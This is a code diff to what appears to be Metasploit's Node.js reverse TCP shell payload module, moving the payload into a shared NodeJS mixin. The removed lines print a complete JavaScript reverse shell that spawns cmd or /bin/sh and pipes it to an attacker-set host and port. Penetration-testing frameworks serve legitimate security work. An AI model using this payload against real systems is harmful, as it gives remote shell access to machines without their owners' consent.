+++ modules/payloads/singles/nodejs/shell_reverse_tcp.rb
@@ -10,12 +10,14 @@
 # settle for just getting shells on nodejs.
 
 require 'msf/core'
+require 'msf/core/payload/nodejs'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 
 module Metasploit3
 
   include Msf::Payload::Single
+  include Msf::Payload::NodeJS
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -44,24 +46,6 @@ module Metasploit3
   # Returns the JS string to use for execution
   #
   def command_string
-    lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
-    cmd   = <<EOS
-(function(){
-  var require = global.require || global.process.mainModule.constructor._load;
-  if (!require) return;
-  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
-  var net = require("net"),
-      cp = require("child_process"),
-      util = require("util"),
-      sh = cp.spawn(cmd, []);
-  var client = this;
-  client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", function() {
-    client.socket.pipe(sh.stdin);
-    util.pump(sh.stdout, client.socket);
-    util.pump(sh.stderr, client.socket);
-  });
-})();
-EOS
-    return "#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}"
+    nodejs_reverse_tcp
   end
 end
